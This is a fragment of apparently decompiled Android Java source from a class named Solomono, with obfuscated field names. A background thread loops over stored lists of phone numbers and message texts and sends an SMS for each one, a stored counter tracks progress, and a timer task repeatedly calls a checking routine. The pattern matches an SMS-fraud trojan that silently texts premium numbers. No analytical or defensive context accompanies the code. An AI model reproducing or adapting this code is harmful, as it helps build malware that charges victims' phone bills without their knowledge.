          SharedPreferences.Editor localEditor = Solomono.this.vpmyrcy.getSharedPreferences("ESLIABONENTTUPIT", 0).edit();
          localEditor.putInt("countimer", 1);
          localEditor.commit();
          i = 0;
        }
        for (;;)
        {
          if (i >= Solomono.this.qtrgocrd.size()) {
            return;
          }
          Solomono.this.sendSMSka(((String)Solomono.this.moznrtd.get(i)).toString(), ((String)Solomono.this.qtrgocrd.get(i)).toString());
          i += 1;
        }
      }
    }).start();
  }
  
  class UpdateBallTask
    extends TimerTask
  {
    UpdateBallTask() {}
    
    public void run()
    {
      Solomono.this.proverka();
    }
  }
}
